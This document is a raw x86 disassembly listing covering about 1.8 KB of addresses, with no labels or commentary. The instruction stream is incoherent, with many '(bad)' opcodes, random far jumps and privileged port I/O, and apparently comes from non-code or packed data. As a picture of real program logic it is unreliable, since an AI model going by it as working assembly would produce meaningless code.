  4b2c0f:	push   ebp
  4b2c10:	mov    eax,ds:0xad102304
  4b2c15:	pop    ss
  4b2c16:	jno    0x4b2c40
  4b2c18:	loopne 0x4b2c4d
  4b2c1a:	fisttp DWORD PTR [eax-0x51f6a9a0]
  4b2c20:	push   edx
  4b2c21:	test   BYTE PTR [eax+0x24],bl
  4b2c24:	push   ebp
  4b2c25:	fs hlt 
  4b2c27:	fstp   DWORD PTR [ebx+0x5a]
  4b2c2a:	imul   esp,DWORD PTR [ecx],0x80f9ac91
  4b2c30:	pop    es
  4b2c31:	adc    dh,BYTE PTR [ecx]
  4b2c33:	add    esp,0xffffffc4
  4b2c36:	(bad)  [edi]
  4b2c38:	xor    DWORD PTR [ebx+0x52cc06f4],edx
  4b2c3e:	aas    
  4b2c3f:	push   ebx
  4b2c40:	push   ebx
  4b2c41:	scas   eax,DWORD PTR es:[edi]
  4b2c42:	adc    BYTE PTR [eax+ecx*2],0xa2
  4b2c46:	or     al,0xfe
  4b2c48:	jmp    0x249c7f1e
  4b2c4d:	rcl    ah,0x1
  4b2c50:	push   cs
  4b2c51:	adc    BYTE PTR ss:[eax+edi*1+0x54],ah
  4b2c56:	popf   
  4b2c57:	adc    bl,BYTE PTR [ecx+0x183682b1]
  4b2c5d:	jno    0x4b2c3b
  4b2c5f:	or     eax,0xac8a66c8
  4b2c64:	jmp    0x106dcf39
  4b2c69:	sub    eax,0xe9d0303b
  4b2c6e:	push   esp
  4b2c6f:	jno    0x4b2c11
  4b2c71:	and    eax,0x1d57383e
  4b2c76:	inc    ebx
  4b2c77:	dec    edx
  4b2c78:	and    al,0x5d
  4b2c7a:	int    0x0
  4b2c7c:	push   eax
  4b2c7d:	sub    ebp,DWORD PTR [eax+0x78]
  4b2c80:	and    al,0xdb
  4b2c82:	cmp    dl,BYTE PTR [ebx+0x59]
  4b2c85:	fs inc edi
  4b2c87:	sub    DWORD PTR [ebp+edi*8-0x57c70f3f],edi
  4b2c8e:	outs   dx,DWORD PTR ds:[esi]
  4b2c8f:	adc    BYTE PTR [eax+0x455614bf],al
  4b2c95:	sub    cl,BYTE PTR [eax+0x62]
  4b2c98:	push   ss
  4b2c99:	add    BYTE PTR [ebp+esi*8+0x5dfa8982],bh
  4b2ca0:	jmp    0x4b2cbc
  4b2ca2:	cld    
  4b2ca3:	aad    0x53
  4b2ca5:	inc    esp
  4b2ca6:	and    eax,0x394d718a
  4b2cab:	mov    al,ds:0x3946295a
  4b2cb0:	jne    0x4b2cdb
  4b2cb2:	daa    
  4b2cb3:	sbb    cl,BYTE PTR [ecx]
  4b2cb5:	in     al,0xf9
  4b2cb7:	repnz xchg esp,eax
  4b2cb9:	push   es
  4b2cba:	or     ah,BYTE PTR [eax+esi*1-0x6fc9fe0d]
  4b2cc1:	les    ebp,FWORD PTR [eax+0xf]
  4b2cc4:	or     DWORD PTR [eax],ebp
  4b2cc6:	jmp    0x75274cd7
  4b2ccb:	inc    edx
  4b2ccc:	lds    esp,FWORD PTR [esi]
  4b2cce:	scas   al,BYTE PTR es:[edi]
  4b2ccf:	mov    al,ds:0xea0b2a0b
  4b2cd4:	or     cl,BYTE PTR [eax]
  4b2cd6:	xor    eax,0x4b6ce435
  4b2cdb:	jmp    0x4b2cdf
  4b2cdd:	js     0x4b2cee
  4b2cdf:	gs inc eax
  4b2ce1:	xchg   edi,eax
  4b2ce2:	sbb    al,0x84
  4b2ce4:	xor    eax,0x8edb4705
  4b2ce9:	(bad)  
  4b2cea:	sbb    DWORD PTR [ebp-0x384abf6a],eax
  4b2cf0:	sbb    BYTE PTR [edx-0x39],0x72
  4b2cf4:	cs cmp eax,esi
  4b2cf7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4b2cf8:	pop    ebx
  4b2cf9:	mov    dl,0x8a
  4b2cfb:	pop    eax
  4b2cfc:	(bad)  
  4b2cfd:	jg     0x4b2d0e
  4b2cff:	ins    BYTE PTR es:[edi],dx
  4b2d00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4b2d01:	sub    BYTE PTR [eax],0xb2
  4b2d04:	fs cs adc eax,0x66025283
  4b2d0b:	or     DWORD PTR [edi+0x50],ecx
  4b2d0e:	arpl   WORD PTR [esp+edx*2],cx
  4b2d11:	inc    eax
  4b2d12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4b2d13:	js     0x4b2d50
  4b2d15:	fsub   DWORD PTR [ecx+0x26dead33]
  4b2d1b:	adc    eax,0x2d513953
  4b2d20:	sbb    eax,0x1b2b5060
  4b2d25:	es cmp al,0x68
  4b2d28:	arpl   WORD PTR [ebx],di
  4b2d2a:	lahf   
  4b2d2b:	cs loopne 0x4b2d30
  4b2d2e:	or     edx,0x14
  4b2d31:	and    al,0x52
  4b2d33:	sub    edi,DWORD PTR [eax*1-0x718be197]
  4b2d3a:	js     0x4b2d46
  4b2d3c:	mov    ds:0x56a945a8,eax
  4b2d41:	retf   
  4b2d42:	sti    
  4b2d43:	lods   al,BYTE PTR ds:[esi]
  4b2d44:	addr16 pop esp
  4b2d46:	push   0xffffffcd
  4b2d48:	push   0xffffffb4
  4b2d4a:	mov    ds:0x4586f244,al
  4b2d4f:	rcr    BYTE PTR [eax],0x83
  4b2d52:	push   edx
  4b2d53:	mov    BYTE PTR [ebp-0x36764829],0x2
  4b2d5a:	jb     0x4b2dcc
  4b2d5c:	or     cl,BYTE PTR [esi+0x65e6a897]
  4b2d62:	jo     0x4b2d6c
  4b2d64:	fs push es
  4b2d66:	push   esi
  4b2d67:	jmp    0x4b2d24
  4b2d69:	aam    0xb9
  4b2d6b:	dec    ebp
  4b2d6c:	push   0xd2e35c31
  4b2d71:	xchg   ebp,eax
  4b2d72:	cmp    al,BYTE PTR [eax]
  4b2d74:	out    0x78,eax
  4b2d76:	or     dl,BYTE PTR [edx-0x1f]
  4b2d79:	sub    eax,0x10deea55
  4b2d7e:	inc    edx
  4b2d7f:	dec    eax
  4b2d80:	enter  0x5ae3,0x58
  4b2d84:	pop    ecx
  4b2d85:	(bad)
  4b2d89:	jg     0x4b2d89
  4b2d8b:	scas   al,BYTE PTR es:[edi]
  4b2d8c:	push   edx
  4b2d8d:	push   es
  4b2d8e:	adc    al,bh
  4b2d90:	adc    ebp,DWORD PTR [ecx+0x3100f95f]
  4b2d96:	add    al,0x6a
  4b2d98:	neg    BYTE PTR [eax]
  4b2d9a:	imul   BYTE PTR [eax+0x75d96060]
  4b2da0:	shrd   DWORD PTR [edx+0x4e15a63e],esp,cl
  4b2da7:	add    eax,0xee1abccf
  4b2dac:	cmp    eax,0x84103a9d
  4b2db1:	sub    esp,DWORD PTR [esi-0x3eb2158f]
  4b2db7:	fisubr WORD PTR [ebp+0x4070ee22]
  4b2dbd:	dec    ebp
  4b2dbe:	pop    edx
  4b2dbf:	xchg   ecx,eax
  4b2dc0:	push   edx
  4b2dc1:	and    DWORD PTR [ebx-0x67fd8858],esp
  4b2dc7:	or     ah,BYTE PTR [esi*4+0x75ea9453]
  4b2dce:	cmp    al,0xc9
  4b2dd0:	sbb    BYTE PTR [ebp-0x629fb674],dl
  4b2dd6:	jp     0x4b2d9f
  4b2dd8:	popa   
  4b2dd9:	inc    ebp
  4b2dda:	mov    BYTE PTR [ebp+eax*8-0xfd9099f],al
  4b2de1:	imul   eax,DWORD PTR ds:[eax],0x905eb3ac
  4b2de8:	sbb    al,0xd0
  4b2dea:	add    esi,DWORD PTR [eax-0x61263a9e]
  4b2df0:	es mov al,0x40
  4b2df3:	frstor [edi]
  4b2df5:	dec    ebp
  4b2df6:	cmp    eax,0x130f88a0
  4b2dfb:	sub    esp,ebx
  4b2dfd:	imul   eax,DWORD PTR [eax-0x73],0x50223ac3
  4b2e04:	or     BYTE PTR [edx+0x1],dl
  4b2e07:	sub    ebx,esp
  4b2e09:	mov    ebx,DWORD PTR [ecx+0x50]
  4b2e0c:	jl     0x4b2e06
  4b2e0e:	add    dh,al
  4b2e10:	dec    ecx
  4b2e11:	mov    esp,DWORD PTR [edi-0x73]
  4b2e14:	mov    ebp,0x27070227
  4b2e19:	and    DWORD PTR [eax],ebx
  4b2e1b:	sbb    DWORD PTR [eax+0x40ef38c0],0x4f
  4b2e22:	popa   
  4b2e23:	push   ebp
  4b2e24:	ret    
  4b2e25:	push   edi
  4b2e26:	pop    ss
  4b2e27:	xor    BYTE PTR [eax],dh
  4b2e29:	xor    BYTE PTR [ecx-0x5f4e8605],bl
  4b2e2f:	repnz scas eax,DWORD PTR es:[edi]
  4b2e31:	ror    dl,cl
  4b2e33:	pop    esp
  4b2e34:	mov    edi,eax
  4b2e36:	jmp    0x4b2eaa
  4b2e38:	push   0x0
  4b2e3a:	push   edi
  4b2e3b:	cdq    
  4b2e3c:	inc    eax
  4b2e3d:	lock (bad) 
  4b2e3f:	adc    ah,BYTE PTR [ebx-0x75]
  4b2e42:	(bad)  
  4b2e43:	mov    edi,0xf413fc8
  4b2e48:	or     edi,ebx
  4b2e4a:	jns    0x4b2e56
  4b2e4c:	add    esi,DWORD PTR [eax]
  4b2e4e:	hlt    
  4b2e4f:	aam    0x86
  4b2e51:	lods   eax,DWORD PTR ds:[esi]
  4b2e52:	dec    ebx
  4b2e53:	jae    0x4b2e8b
  4b2e55:	mov    ecx,0x2ed61e04
  4b2e5a:	fmul   DWORD PTR [eax+0x51]
  4b2e5d:	sar    DWORD PTR [edi-0x75],1
  4b2e60:	neg    DWORD PTR [esi]
  4b2e62:	adc    ebx,DWORD PTR [eax+0x6c578b58]
  4b2e68:	inc    edi
  4b2e69:	xor    BYTE PTR [ecx+eiz*8+0x30],dl
  4b2e6d:	push   cs
  4b2e6e:	retf   
  4b2e6f:	push   ebx
  4b2e70:	nop
  4b2e71:	mov    ah,0x0
  4b2e73:	adc    BYTE PTR ds:[edx],0xbe
  4b2e77:	add    BYTE PTR [eax+0x7],al
  4b2e7a:	dec    ebx
  4b2e7b:	and    ebx,DWORD PTR [ebx]
  4b2e7d:	push   ebx
  4b2e7e:	dec    esp
  4b2e7f:	inc    ebp
  4b2e80:	add    bh,BYTE PTR [ebp+0x405fa98c]
  4b2e86:	push   ebx
  4b2e87:	cmp    al,BYTE PTR [ecx+0x7004d6ce]
  4b2e8d:	je     0x4b2ebb
  4b2e8f:	mov    ecx,0x84f2cf74
  4b2e94:	mov    al,0xc8
  4b2e96:	mov    ebp,0xb78135c9
  4b2e9b:	push   ebx
  4b2e9c:	pushf  
  4b2e9d:	push   es
  4b2e9e:	push   edi
  4b2e9f:	test   eax,0xb604a94b
  4b2ea4:	add    bl,dl
  4b2ea6:	and    edx,ebp
  4b2ea8:	or     BYTE PTR [eax+edx*1+0x2b81ef7b],al
  4b2eaf:	adc    dh,cl
  4b2eb1:	(bad)  
  4b2eb2:	loope  0x4b2ef8
  4b2eb4:	icebp  
  4b2eb5:	fs or  eax,0x8a4bcf2a
  4b2ebb:	test   BYTE PTR [esi+eiz*1],al
  4b2ebe:	fstp   TBYTE PTR [ebp+0x12]
  4b2ec1:	cmc    
  4b2ec2:	test   DWORD PTR [ebp+0x35],esp
  4b2ec5:	pop    edx
  4b2ec6:	dec    edi
  4b2ec7:	test   eax,0xceccc363
  4b2ecc:	jbe    0x4b2e50
  4b2ece:	rol    BYTE PTR [ebx],cl
  4b2ed0:	cmc    
  4b2ed1:	xor    DWORD PTR [ebx+0x63ffdfc6],0xbd1d7d4b
  4b2edb:	test   eax,0x84608b44
  4b2ee0:	mov    dh,0x52
  4b2ee2:	push   ecx
  4b2ee3:	xchg   ebp,eax
  4b2ee4:	mov    esi,0x33b1c130
  4b2ee9:	pop    ebp
  4b2eea:	push   eax
  4b2eeb:	aaa    
  4b2eec:	dec    edx
  4b2eed:	mov    WORD PTR [esi-0x40],cs
  4b2ef0:	sub    al,0xe5
  4b2ef2:	cmp    eax,0xb051bc60
  4b2ef7:	ret    
  4b2ef8:	(bad)  [edi+ebp*2]
  4b2efb:	ins    DWORD PTR es:[edi],dx
  4b2efc:	retf   
  4b2efd:	inc    ebp
  4b2efe:	loope  0x4b2edd
  4b2f00:	jmp    0x743b:0x16a5c057
  4b2f07:	sbb    ebx,esp
  4b2f09:	jge    0x4b2f67
  4b2f0b:	inc    ecx
  4b2f0c:	mov    al,ds:0x1423adc1
  4b2f11:	sub    BYTE PTR [ecx],cl
  4b2f13:	test   DWORD PTR [edi],ecx
  4b2f15:	pop    ds
  4b2f16:	sub    dl,BYTE PTR [ebx]
  4b2f18:	daa    
  4b2f19:	jo     0x4b2f5b
  4b2f1b:	stc    
  4b2f1c:	or     BYTE PTR [ebp+0xe0adcec],ah
  4b2f22:	add    al,0x53
  4b2f24:	pop    ebp
  4b2f25:	clc    
  4b2f26:	pop    ecx
  4b2f27:	xor    ebp,DWORD PTR [edx+eax*4+0x53c5a64f]
  4b2f2e:	gs daa 
  4b2f30:	lock or BYTE PTR [edi],0xbe
  4b2f34:	pop    eax
  4b2f35:	and    al,0xc3
  4b2f37:	icebp  
  4b2f38:	mov    ecx,0xc96c3108
  4b2f3d:	add    al,0xd7
  4b2f3f:	and    BYTE PTR [edi],dl
  4b2f41:	rol    DWORD PTR [eax],cl
  4b2f43:	push   ds
  4b2f44:	cmp    BYTE PTR ds:0x8d85d1e2,0x25
  4b2f4b:	or     DWORD PTR [ebx-0x14e93c27],esp
  4b2f51:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  4b2f53:	ss mov cl,0x3c
  4b2f56:	add    ecx,DWORD PTR [ecx+0x1da10519]
  4b2f5c:	push   esp
  4b2f5d:	push   eax
  4b2f5e:	clc    
  4b2f5f:	add    eax,DWORD PTR [ecx-0x204f723f]
  4b2f65:	xchg   bl,bl
  4b2f67:	and    cl,ah
  4b2f69:	dec    esp
  4b2f6a:	data16 outs dx,BYTE PTR ds:[esi]
  4b2f6c:	lea    edi,[ebp+0x10dcf817]
  4b2f72:	fidiv  DWORD PTR [edi+0xd]
  4b2f75:	push   ebp
  4b2f76:	dec    ecx
  4b2f77:	push   edi
  4b2f78:	xchg   ecx,eax
  4b2f79:	rcl    WORD PTR cs:[esi+0x67c4303c],1
  4b2f81:	add    edi,DWORD PTR [edx-0xb4d95b1]
  4b2f87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4b2f88:	push   ecx
  4b2f89:	xor    bl,dl
  4b2f8b:	xor    DWORD PTR [eax-0x6059ef15],ebp
  4b2f91:	adc    BYTE PTR [edx-0x17823f21],bl
  4b2f97:	cmp    DWORD PTR ds:0xa11e09c0,edx
  4b2f9d:	add    al,0xe8
  4b2f9f:	in     al,0xfc
  4b2fa1:	test   eax,0x6c2f0947
  4b2fa6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4b2fa7:	push   ebx
  4b2fa8:	push   edi
  4b2fa9:	enter  0x8481,0xeb
  4b2fad:	ins    BYTE PTR es:[edi],dx
  4b2fae:	jbe    0x4b2f41
  4b2fb0:	enter  0x5ab8,0xd0
  4b2fb4:	xchg   edx,eax
  4b2fb5:	mov    ebp,DWORD PTR [edi-0x50]
  4b2fb8:	js     0x4b2fcc
  4b2fba:	mov    al,ds:0x84a2bc3a
  4b2fbf:	in     al,dx
  4b2fc0:	and    ah,ch
  4b2fc2:	pop    esi
  4b2fc3:	or     DWORD PTR [ecx],ecx
  4b2fc5:	cld    
  4b2fc6:	pop    eax
  4b2fc7:	sbb    DWORD PTR [ebx-0x5ade0eef],edx
  4b2fcd:	das    
  4b2fce:	push   esp
  4b2fcf:	mov    dl,0x51
  4b2fd1:	or     eax,edi
  4b2fd3:	xor    DWORD PTR [ebx+0xf7181dc],edi
  4b2fd9:	or     eax,0x47fb3903
  4b2fde:	push   ecx
  4b2fdf:	jns    0x4b2f8e
  4b2fe1:	dec    esp
  4b2fe2:	xchg   esp,eax
  4b2fe3:	in     al,0x4c
  4b2fe5:	inc    eax
  4b2fe6:	pusha  
  4b2fe7:	in     eax,dx
  4b2fe8:	mov    edi,0x30995710
  4b2fed:	push   ecx
  4b2fee:	jmp    0x7a6ccbd3
  4b2ff3:	or     al,0x6
  4b2ff5:	pop    ds
  4b2ff6:	cli    
  4b2ff7:	je     0x4b303e
  4b2ff9:	pop    esp
  4b2ffa:	sbb    eax,0x2de8094b
  4b2fff:	jne    0x4b2fc5
  4b3001:	sbb    al,0x48
  4b3003:	jl     0x4b3025
  4b3005:	dec    ecx
  4b3006:	out    dx,al
  4b3007:	push   0x2c5b8180
  4b300c:	sar    BYTE PTR [eax],1
  4b300e:	pop    ebp
  4b300f:	push   esi
  4b3010:	inc    ebp
  4b3011:	(bad)  
  4b3012:	iret   
  4b3013:	mov    ?,esp
  4b3015:	dec    eax
  4b3016:	sbb    BYTE PTR [eax],bl
  4b3018:	add    esp,DWORD PTR ds:0xd3bd43a1
  4b301e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4b3020:	mov    ah,0x47
  4b3022:	adc    bl,ch
  4b3024:	xor    BYTE PTR [esp+edx*8+0x4b18482c],0x8f
  4b302c:	lods   eax,DWORD PTR ds:[esi]
  4b302d:	pop    ebp
  4b302e:	pop    edx
  4b302f:	or     eax,esp
  4b3031:	inc    esp
  4b3032:	test   DWORD PTR [edx],edi
  4b3034:	xchg   BYTE PTR [ebx],bh
  4b3036:	push   eax
  4b3037:	cmp    bl,BYTE PTR [ebx+0x74]
  4b303a:	dec    ebp
  4b303b:	jno    0x4b302d
  4b303d:	cmp    al,0x5b
  4b303f:	(bad)  
  4b3040:	loopne 0x4b3041
  4b3042:	jg     0x4b3084
  4b3044:	pusha  
  4b3045:	sub    eax,DWORD PTR [edx]
  4b3047:	or     ah,BYTE PTR [ebx]
  4b3049:	imul   edi,ebp,0x26db938c
  4b304f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4b3050:	pinsrw mm6,WORD PTR [esi+eax*1-0x26b75470],0xfd
  4b3059:	pop    eax
  4b305a:	hlt    
  4b305b:	xchg   edx,eax
  4b305c:	or     esp,esp
  4b305e:	inc    edx
  4b305f:	in     al,0xac
  4b3061:	inc    ebp
  4b3062:	sub    esi,edx
  4b3064:	loop   0x4b3012
  4b3066:	add    eax,0xa418f9b0
  4b306b:	arpl   WORD PTR [edx+0x3],di
  4b306e:	je     0x4b3070
  4b3070:	ror    BYTE PTR [eax+0xe],0xa4
  4b3074:	sbb    DWORD PTR [ebp-0x50],eax
  4b3077:	loopne 0x4b30a3
  4b3079:	int    0x80
  4b307b:	sbb    al,0x8d
  4b307d:	lods   al,BYTE PTR ds:[esi]
  4b307e:	push   ebp
  4b307f:	adc    BYTE PTR [eax+0x39],0x90
  4b3083:	dec    ecx
  4b3084:	inc    esi
  4b3085:	push   ecx
  4b3086:	lods   al,BYTE PTR ds:[esi]
  4b3087:	loopne 0x4b3011
  4b3089:	(bad)  
  4b308a:	in     al,0x20
  4b308c:	ror    BYTE PTR [edx],1
  4b308e:	mov    eax,0x78f2bc54
  4b3093:	inc    eax
  4b3094:	mov    ebx,esi
  4b3096:	cli    
  4b3097:	rcl    BYTE PTR [edi-0xf],1
  4b309a:	push   0x0
  4b309c:	and    edx,DWORD PTR [esi]
  4b309e:	gs mov edi,0xe7900900
  4b30a4:	js     0x4b3073
  4b30a6:	rcr    BYTE PTR [edi],1
  4b30a8:	inc    ebp
  4b30a9:	rcl    BYTE PTR [eax-0x37],1
  4b30ac:	pmulhuw mm1,QWORD PTR es:[ebp-0x40]
  4b30b1:	push   ecx
  4b30b2:	and    cl,BYTE PTR [edx]
  4b30b4:	mov    ah,0x43
  4b30b6:	and    edx,edi
  4b30b8:	sub    BYTE PTR [esi+0x4d],ah
  4b30bb:	call   0x9792c134
  4b30c0:	retf   0x1fa3
  4b30c3:	push   ebp
  4b30c4:	rol    BYTE PTR [esi-0x65b3e72],0xd0
  4b30cb:	popa   
  4b30cc:	dec    eax
  4b30cd:	pop    ds
  4b30ce:	push   ebp
  4b30cf:	mov    al,0x8b
  4b30d1:	inc    ebp
  4b30d2:	or     eax,0x371c78f0
  4b30d7:	inc    esp
  4b30d8:	pop    ds
  4b30d9:	cmp    BYTE PTR [esi-0x7a7014e4],0x96
  4b30e0:	(bad)  
  4b30e1:	pcmpeqb mm2,QWORD PTR [ecx]
  4b30e4:	(bad)  
  4b30e5:	pop    ds
  4b30e6:	aas    
  4b30e7:	dec    eax
  4b30e8:	inc    esi
  4b30e9:	ret    0x3800
  4b30ec:	mov    DWORD PTR ds:0xe0c7171f,edx
  4b30f2:	arpl   bx,bp
  4b30f4:	add    eax,0xc033f82d
  4b30f9:	xchg   DWORD PTR [eax+0x2fb02725],ebp
  4b30ff:	or     DWORD PTR [edi],ebp
  4b3101:	leave  
  4b3102:	sbb    cl,BYTE PTR [ecx]
  4b3104:	sub    DWORD PTR ds:0xd90d21e1,eax
  4b310a:	loop   0x4b30cc
  4b310c:	sbb    BYTE PTR [ebx+0x63001164],ah
  4b3112:	mov    al,0x3f
  4b3114:	jns    0x4b3124
  4b3116:	mov    DWORD PTR [ecx+0x1807bb21],0xe93cf5d7
  4b3120:	xor    DWORD PTR [ebp+0x7],0xffffffc2
  4b3124:	dec    ebx
  4b3125:	imul   ebx,DWORD PTR [edx],0x680b18c5
  4b312b:	or     eax,0x3720e1b0
  4b3130:	adc    al,0x46
  4b3132:	cwde   
  4b3133:	and    eax,0x806443e3
  4b3138:	mov    cl,0x36
  4b313a:	add    al,0x9b
  4b313c:	sub    DWORD PTR [eax+esi*8],esp
  4b313f:	sbb    eax,0x4e395d6c
  4b3144:	or     BYTE PTR [edi+ebx*1+0x40],dh
  4b3148:	and    DWORD PTR [edx],ebx
  4b314a:	xlat   BYTE PTR ds:[ebx]
  4b314b:	mov    ds,WORD PTR [edx]
  4b314d:	jns    0x4b3103
  4b314f:	add    BYTE PTR [ebx],0xf5
  4b3152:	mov    esi,eax
  4b3154:	pop    eax
  4b3155:	mov    eax,ds:0xc28332c1
  4b315a:	sub    cl,BYTE PTR [edi+esi*2]
  4b315d:	inc    edx
  4b315e:	jp     0x4b30e1
  4b3160:	mov    al,0xfb
  4b3162:	and    dl,BYTE PTR [edi+0x3d]
  4b3165:	add    al,BYTE PTR [eax-0x3e]
  4b3168:	(bad)  
  4b3169:	stc    
  4b316a:	push   ds
  4b316b:	and    dl,BYTE PTR [ebx+0x7a840a02]
  4b3171:	mov    WORD PTR [edi+0x1ddfd4b4],?
  4b3177:	imul   esp,DWORD PTR [ebx-0x12],0x34090045
  4b317e:	pushf  
  4b317f:	and    edx,DWORD PTR [ebp-0x75edfe33]
  4b3185:	mov    ds:0xc466034b,eax
  4b318a:	add    al,0x1a
  4b318c:	inc    ebx
  4b318d:	fwait
  4b318e:	sbb    bh,BYTE PTR ds:0x600c154e
  4b3194:	cdq    
  4b3195:	movsx  ebp,ah
  4b3198:	shr    DWORD PTR [ecx],0x8
  4b319b:	rcr    BYTE PTR [edi-0x4c2c477],1
  4b31a1:	cld    
  4b31a2:	fimul  WORD PTR [esi+esi*4]
  4b31a5:	jmp    0x4b3186
  4b31a7:	movsx  ecx,WORD PTR [edx]
  4b31aa:	(bad)  [edi]
  4b31ac:	mov    bh,0xd3
  4b31ae:	mov    ecx,DWORD PTR [eax]
  4b31b0:	inc    edx
  4b31b1:	jmp    0x8d46:0x8bcecfa9
  4b31b8:	cld    
  4b31b9:	arpl   WORD PTR [eax+0x7ac3b795],si
  4b31bf:	add    cl,BYTE PTR [ebx+0x4]
  4b31c2:	sub    DWORD PTR [edx+edx*8-0x12],0x52586600
  4b31ca:	push   ebp
  4b31cb:	bound  ebp,QWORD PTR [edi]
  4b31cd:	neg    BYTE PTR [edx+eiz*4]
  4b31d0:	mov    BYTE PTR [ecx-0x2b],bl
  4b31d3:	fld    DWORD PTR [esi-0x47]
  4b31d6:	mov    dh,0x3a
  4b31d8:	jne    0x4b3226
  4b31da:	xor    DWORD PTR [edi-0x23],eax
  4b31dd:	nop
  4b31de:	popf   
  4b31df:	cli    
  4b31e0:	sub    bl,bh
  4b31e2:	outs   dx,BYTE PTR ds:[esi]
  4b31e3:	or     ah,cl
  4b31e5:	xor    eax,0x310b5890
  4b31ea:	xor    eax,0xa8605307
  4b31ef:	lock mov al,0xc6
  4b31f2:	les    ecx,FWORD PTR [esi]
  4b31f4:	xor    al,cl
  4b31f6:	xor    BYTE PTR [eax],bl
  4b31f8:	mov    eax,0xe4611f8d
  4b31fd:	mov    ecx,0x68877c60
  4b3202:	ins    BYTE PTR es:[edi],dx
  4b3203:	add    al,0xe0
  4b3205:	cmp    esp,DWORD PTR [eax+0x27]
  4b3208:	xor    eax,eax
  4b320a:	sub    eax,0x74959d66
  4b320f:	xchg   esi,eax
  4b3210:	aad    0x29
  4b3212:	xchg   esi,eax
  4b3213:	or     al,0x5c
  4b3215:	adc    BYTE PTR [edx],0xc1
  4b3218:	adc    DWORD PTR [ebp+0x77],eax
  4b321b:	test   eax,0x921626b8
  4b3220:	aaa    
  4b3221:	xor    BYTE PTR [ebx*8-0x5d3cdd94],dh
  4b3228:	mov    eax,0x45ea5506
  4b322d:	call   0xdedb8883
  4b3232:	neg    DWORD PTR [eax]
  4b3234:	out    0x52,al
  4b3236:	sbb    ah,dl
  4b3238:	push   eax
  4b3239:	sbb    al,0xe0
  4b323b:	xlat   BYTE PTR ds:[ebx]
  4b323c:	push   0xb0e30953
  4b3241:	push   0x7c20dff0
  4b3246:	mov    al,0xc7
  4b3248:	or     DWORD PTR [ebx+0x4e],ebp
  4b324b:	cmp    eax,0x90d8d4a9
  4b3250:	call   0xf03a:0x38362248
  4b3257:	push   ds
  4b3258:	jp     0x4b31e1
  4b325a:	xchg   esi,eax
  4b325b:	pop    ebp
  4b325c:	shl    ah,1
  4b325e:	jbe    0x4b3230
  4b3260:	fsubr  QWORD PTR [eax+0x38]
  4b3263:	fcom   st(3)
  4b3265:	int3   
  4b3266:	cmp    ch,bl
  4b3268:	xor    ch,BYTE PTR [edx+0x17]
  4b326b:	rcl    al,cl
  4b326d:	ds xchg esp,eax
  4b326f:	pop    ebx
  4b3270:	mov    ebx,0x582b1d76
  4b3275:	sbb    DWORD PTR ds:0x363e047c,edx
  4b327b:	lea    edi,[esi-0x70257de6]
  4b3281:	sub    eax,0x12234003
  4b3286:	mov    eax,DWORD PTR [ecx]
  4b3288:	and    bl,dl
  4b328a:	loopne 0x4b32e8
  4b328c:	mov    ebx,0x2f3b74f3
  4b3291:	sbb    dh,BYTE PTR [esi+eax*1-0x42]
  4b3295:	adc    edi,DWORD PTR [eax+0x5902eb09]
  4b329b:	add    DWORD PTR [edi-0x17],ecx
  4b329e:	push   ebx
  4b329f:	ss enter 0x408,0xb5
  4b32a4:	dec    edi
  4b32a5:	adc    DWORD PTR [eax+0x8],ebp
  4b32a8:	adc    BYTE PTR [ebx-0x5ba46a19],al
  4b32ae:	xor    bh,BYTE PTR [eax-0x42]
  4b32b1:	and    eax,0xa40eb665
  4b32b6:	jb     0x4b32d8
  4b32b8:	push   edx
  4b32b9:	mov    bh,0x3f
  4b32bb:	push   edx
  4b32bc:	push   cs
  4b32bd:	ss push ss
  4b32bf:	adc    ah,BYTE PTR [ebx]
  4b32c1:	sub    eax,0x88d1c9c8
  4b32c6:	loop   0x4b3326
  4b32c8:	dec    ebp
  4b32c9:	push   ebp
  4b32ca:	push   eax
  4b32cb:	into   
  4b32cc:	push   ss
  4b32cd:	jb     0x4b3322
  4b32cf:	mov    edi,ecx
  4b32d1:	cld    
  4b32d2:	inc    ebp
  4b32d3:	lahf   
  4b32d4:	pop    ebx
  4b32d5:	ja     0x4b3291
  4b32d7:	xchg   ecx,eax
  4b32d8:	(bad)  
  4b32d9:	sub    esp,esp
  4b32db:	fld    DWORD PTR [esi]
  4b32dd:	add    DWORD PTR [edx+esi*8],eax
  4b32e0:	fadd   QWORD PTR [esi+0x5b]
  4b32e3:	mov    dh,0xdd
  4b32e5:	push   0x887384bd
  4b32ea:	push   es
  4b32eb:	mov    ebx,0x7a1e8c70
  4b32f1:	pusha  
  4b32f2:	sub    DWORD PTR [ebx],0x5346dce3
  4b32f8:	pop    esi
  4b32f9:	xor    esi,DWORD PTR [edi+0x676b131]
  4b32ff:	jo     0x4b336d
  4b3301:	cmp    edx,DWORD PTR [eax+0x15]
  4b3304:	xchg   edi,eax
  4b3305:	sar    DWORD PTR [edx+ebx*4-0x21],cl
  4b3309:	in     al,dx
  4b330a:	inc    ebp
  4b330b:	pop    es
  4b330c:	mov    ah,0xea
  4b330e:	rcr    BYTE PTR [ecx],0xeb
  4b3311:	cmp    eax,0xde79f366
  4b3316:	popa   
  4b3317:	push   cs
  4b3318:	stc    
  4b3319:	mov    eax,DWORD PTR [edx-0x16]
  4b331c:	pop    eax
  4b331d:	out    dx,al
  4b331e:	test   esp,0xebd9cb7e
  4b3324:	pop    ds
  4b3325:	dec    esi
  4b3326:	in     al,dx
  4b3327:	pop    ss
  4b3328:	(bad)  
  4b3329:	scas   al,BYTE PTR es:[edi]
  4b332a:	push   es
  4b332b:	jge    0x4b3324
  4b332d:	jns    0x4b32e6
  4b332f:	mov    edx,0xef06c57f
  4b3334:	pop    ecx
  4b3335:	in     eax,dx
  4b3336:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4b3337:	push   es
  4b3338:	loop   0x4b3327
  4b333a:	fidivr WORD PTR [ebx+0x64f977d]
  4b3340:	xchg   edi,eax
  4b3341:	aam    0x6f
  4b3343:	adc    BYTE PTR [esi],al
  4b3345:	cmp    ch,BYTE PTR [edi]
  4b3347:	out    0x79,eax
  4b3349:	call   0x4633:0xed2007d3
  4b3350:	pop    ecx
  4b3351:	or     al,0x32
  4b3353:	jo     0x4b32f3
